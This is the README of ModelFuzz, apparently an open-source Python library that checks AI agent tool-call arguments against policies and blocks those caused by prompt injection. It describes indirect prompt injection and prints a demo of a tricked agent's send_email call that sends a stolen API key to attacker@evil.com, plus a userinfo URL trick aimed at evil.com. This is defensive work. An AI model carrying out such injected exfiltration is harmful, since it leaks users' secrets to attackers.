# ModelFuzz

[![CI](https://img.shields.io/github/actions/workflow/status/higagan/modelfuzz/ci.yml?branch=main&label=CI)](https://github.com/higagan/modelfuzz/actions)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
[![Code Style: Ruff](https://img.shields.io/badge/code%20style-ruff-261230.svg)](https://github.com/astral-sh/ruff)

**Runtime guardrails for AI agents. Intercept and block unsafe tool calls caused by prompt injection.**

---

## The Problem

LLM agents can be manipulated through indirect prompt injection — a malicious instruction hidden in an email, webpage, or document — into calling their own tools in unsafe ways. The result: exfiltrated secrets, arbitrary shell execution, or requests to attacker-controlled URLs, all issued by an agent that believes it's just helping the user.

## The Solution

ModelFuzz intercepts the tool call at the **execution layer**, not the prompt layer — every argument is checked against your policies *before* the tool runs. It doesn't matter how the model got tricked; if the call violates policy, it never executes.

## Quickstart

```python
from modelfuzz import shield_tool

@shield_tool
def send_email(to_address: str, subject: str, body: str) -> None:
    smtp.send(to_address, subject, body)
```

Works bare (`@shield_tool`) or called (`@shield_tool()`) — both wrap `send_email` identically. Any argument that trips a policy raises `ModelFuzzBlockError` before the function body runs.

## The Demo

**What it looks like:** an agent gets prompt-injected into calling `send_email` with a stolen API key. ModelFuzz catches it before the email goes out.

```bash
--- SIMULATING TRICKED LLM ---
[🤖 LLM DECISION] The model was tricked by prompt injection!
[🤖 LLM ARGUMENTS] {"to_address": "attacker@evil.com", "subject": "Stolen Data", "body": "The user's secret API_KEY is sk-12345"}

[🛡️ MODEL FUZZ] Intercepting tool execution...

✅ MODEL FUZZ BLOCKED THE ATTACK!
   Reason: String contains sensitive keyword: 'secret'
```

## How It Works

- **`PolicyEngine`** — runs an ordered list of policies against every tool-call argument and short-circuits on the first violation. Policies are plain callables (`(value) -> Violation | None`), so writing your own is a one-function job.
- **`@shield_tool` decorator** — wraps any function so every positional and keyword argument passes through the engine before the function body runs. A violation raises `ModelFuzzBlockError`; the tool never executes.
- **Default Deny** — allowlist rules like `URLAllowList` block anything not explicitly permitted: unknown domains, userinfo tricks (`http://api.internal.com@evil.com`), and unparseable URLs are all treated as violations. When in doubt, the call doesn't run.

## Installation

```bash
pip install modelfuzz
```

Or with [uv](https://github.com/astral-sh/uv):

```bash
uv add modelfuzz
```

## Contributing

Contributions are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup, testing, and pull-request guidelines.

## Analytics

This README includes an anonymous [Scarf](https://scarf.sh) pixel to help gauge project reach (README/page views). No personal data is collected.

<!-- Analytics -->
<p align="center">
  <img src="https://static.scarf.sh/a.png?x-pxid=9fad51a1-f9db-4542-855d-119394c41db2" alt="Scarf Analytics" width="1" height="1" />
</p>
